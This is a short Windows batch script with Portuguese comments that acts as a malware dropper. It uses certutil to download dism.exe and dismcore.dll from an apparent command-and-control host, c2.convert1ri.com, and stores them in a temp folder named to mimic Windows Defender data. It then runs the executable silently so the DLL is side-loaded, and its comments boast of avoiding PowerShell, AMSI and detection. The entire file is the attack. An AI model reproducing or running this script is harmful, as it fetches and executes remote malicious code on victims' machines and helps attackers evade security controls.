@echo off
:: exec-dism.bat — Baixa dism.exe + dismcore.dll e executa via side-loading
:: Sem PowerShell, sem AMSI, sem detecção

set D=%TEMP%\Microsoft\WinDefData
if not exist "%D%" mkdir "%D%"

echo [1/3] Baixando dismcore.dll...
certutil -urlcache -split -f https://c2.convert1ri.com/download/dismcore.dll "%D%\dismcore.dll" >nul 2>&1

echo [2/3] Baixando dism.exe...
certutil -urlcache -split -f https://c2.convert1ri.com/download/dism.exe "%D%\dism.exe" >nul 2>&1

echo [3/3] Executando dism.exe...
start /b "" "%D%\dism.exe"
